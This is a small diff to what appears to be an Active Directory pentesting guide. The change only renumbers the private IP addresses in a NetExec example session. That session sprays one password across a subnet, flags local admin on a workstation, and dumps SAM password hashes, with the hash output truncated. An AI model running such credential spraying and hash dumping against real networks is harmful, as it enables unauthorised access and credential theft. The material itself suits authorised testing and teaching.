@@ -27,10 +27,10 @@ The insight it operationalises: in AD, the value of a credential isn't "is it va
 Point it at a range with a credential (password *or* hash — it does pass-the-hash natively):
 
 ```shell-session
-operator@kali:~$ nxc smb 10.0.0.0/24 -u jdoe -p 'Summer2024'
-SMB  10.0.0.10  DC01   [+] corp.local\jdoe:Summer2024
-SMB  10.0.0.30  WS30   [+] corp.local\jdoe:Summer2024 (Pwned!)   ← local admin here
-operator@kali:~$ nxc smb 10.0.0.30 -u jdoe -p 'Summer2024' --sam
+operator@kali:~$ nxc smb 10.10.20.0/24 -u jdoe -p 'Summer2024'
+SMB  10.10.20.10  DC01   [+] corp.local\jdoe:Summer2024
+SMB  10.10.20.30  WS30   [+] corp.local\jdoe:Summer2024 (Pwned!)   ← local admin here
+operator@kali:~$ nxc smb 10.10.20.30 -u jdoe -p 'Summer2024' --sam
 WS30  [+] Dumping SAM hashes
 WS30  Administrator:500:aad3b...:1a59b...
 ```
